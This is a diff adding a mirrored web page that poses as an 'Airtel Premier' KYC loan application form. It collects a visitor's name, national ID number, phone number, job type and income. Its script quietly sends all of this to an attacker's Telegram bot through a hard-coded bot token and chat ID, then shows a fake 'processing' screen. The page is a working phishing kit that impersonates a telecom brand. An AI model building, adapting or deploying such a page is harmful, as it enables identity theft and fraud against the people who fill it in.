@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from airtelloans.netlify.app/loan.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Jan 2026 07:23:55 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>KYC Verification - Airtel Premier</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #ce1e2d 100%);
+            background-attachment: fixed;
+            color: white;
+        }
+        
+        .glass-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 28px;
+        }
+        
+        .input-field {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            width: 100%;
+            padding: 16px;
+            border-radius: 16px;
+            outline: none;
+            transition: all 0.3s;
+        }
+        
+        .input-field:focus {
+            background: rgba(255, 255, 255, 0.15);
+            border-color: rgba(255, 255, 255, 0.4);
+        }
+        
+        #loadingPopup {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 23, 42, 0.9);
+            backdrop-filter: blur(8px);
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex flex-col p-6">
+
+    <div id="loadingPopup">
+        <div class="glass-card p-10 flex flex-col items-center mx-6 max-w-sm w-full text-center">
+            <div class="w-16 h-16 border-4 border-white/20 border-t-white rounded-full animate-spin mb-6"></div>
+            <h2 class="text-xl font-bold mb-2">Processing Request</h2>
+            <p class="text-sm text-white/60">Finalizing credit assessment for your requested amount...</p>
+        </div>
+    </div>
+
+    <header class="flex items-center gap-4 mb-8">
+        <button onclick="window.history.back()" class="w-10 h-10 glass-card flex items-center justify-center">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+            </svg>
+        </button>
+        <h1 class="text-xl font-bold">Loan Application</h1>
+    </header>
+
+    <main class="flex-grow space-y-6 pb-10">
+
+        <div class="glass-card p-6 space-y-5 border-l-4 border-green-500">
+            <h3 class="text-sm font-bold uppercase tracking-widest text-white/50 border-b border-white/10 pb-2">Loan Request</h3>
+
+            <div>
+                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Desired Amount (KES)</label>
+                <div class="flex items-center gap-3 bg-white/5 border border-white/10 p-4 rounded-2xl">
+                    <span class="font-bold text-green-400">KES</span>
+                    <input type="number" id="loanAmount" placeholder="e.g. 5000" class="bg-transparent outline-none w-full font-bold text-xl">
+                </div>
+            </div>
+
+            <div>
+                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Repayment Period</label>
+                <select id="duration" class="input-field bg-[#1e293b]">
+                    <option value="1 Month">1 Month (30 Days)</option>
+                    <option value="3 Months">3 Months</option>
+                    <option value="6 Months">6 Months</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="glass-card p-6 space-y-5">
+            <h3 class="text-sm font-bold uppercase tracking-widest text-white/50 border-b border-white/10 pb-2">Personal Identity</h3>
+
+            <div>
+                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Full Name (Per ID)</label>
+                <input type="text" id="fullName" placeholder="Full legal name" class="input-field">
+            </div>
+
+            <div>
+                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">ID Number</label>
+                <input type="text" id="nrcNumber" placeholder="XXXXXX/XX/X" class="input-field">
+            </div>
+
+            <div>
+                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Airtel/Safaricom</label>
+                <div class="flex items-center gap-3 bg-white/5 border border-white/10 p-4 rounded-2xl">
+                    <span class="font-bold text-white/40">+254</span>
+                    <input type="tel" id="phoneInput" maxlength="9" placeholder="XXXXXXXXX" class="bg-transparent outline-none w-full font-bold">
+                </div>
+            </div>
+        </div>
+
+        <div class="glass-card p-6 space-y-5">
+            <h3 class="text-sm font-bold uppercase tracking-widest text-white/50 border-b border-white/10 pb-2">Financial Status</h3>
+
+            <div>
+                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Source of Income</label>
+                <select id="jobType" class="input-field bg-[#1e293b]">
+                    <option value="" disabled selected>Select Source</option>
+                    <option value="Salaried">Salaried (Government/Private)</option>
+                    <option value="Business">Business / Trading</option>
+                    <option value="Other">Other</option>
+                </select>
+            </div>
+
+            <div>
+                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Monthly Income (KES)</label>
+                <input type="number" id="income" placeholder="Monthly Take Home" class="input-field">
+            </div>
+        </div>
+
+        <button id="submitBtn" class="w-full bg-white text-[#ce1e2d] py-5 rounded-2xl font-black text-lg active:scale-95 transition-all shadow-xl uppercase tracking-widest">
+            Apply Now
+        </button>
+    </main>
+
+    <script>
+        const submitBtn = document.getElementById('submitBtn');
+        const popup = document.getElementById('loadingPopup');
+
+        // --- TELEGRAM CONFIG ---
+        const BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+        const CHAT_ID = '5615316142';
+
+        submitBtn.addEventListener('click', async() => {
+            const data = {
+                amount: document.getElementById('loanAmount').value,
+                duration: document.getElementById('duration').value,
+                name: document.getElementById('fullName').value,
+                nrc: document.getElementById('nrcNumber').value,
+                phone: document.getElementById('phoneInput').value,
+                job: document.getElementById('jobType').value,
+                income: document.getElementById('income').value
+            };
+
+            // Validation
+            if (!data.amount || !data.name || !data.nrc || data.phone.length < 9) {
+                alert("Please fill out all fields to proceed with your application.");
+                return;
+            }
+
+            const fullPhone = "+260" + data.phone;
+            localStorage.setItem('userPhone', fullPhone);
+
+            popup.style.display = 'flex';
+
+            const message = `🏦 <b>NEW LOAN APPLICATION</b>\n\n` +
+                `💰 <b>Amount:</b> K ${data.amount}\n` +
+                `⏳ <b>Duration:</b> ${data.duration}\n` +
+                `👤 <b>Name:</b> ${data.name}\n` +
+                `🆔 <b>NRC:</b> ${data.nrc}\n` +
+                `📱 <b>Phone:</b> <code>${fullPhone}</code>\n` +
+                `💼 <b>Job:</b> ${data.job}\n` +
+                `💵 <b>Income:</b> K ${data.income}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (err) {
+                console.error(err);
+            }
+
+            setTimeout(() => {
+                window.location.href = 'processing.html';
+            }, 4000);
+        });
+    </script>
+</body>
+
+<!-- Mirrored from airtelloans.netlify.app/loan.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Jan 2026 07:23:56 GMT -->
+
+</html>
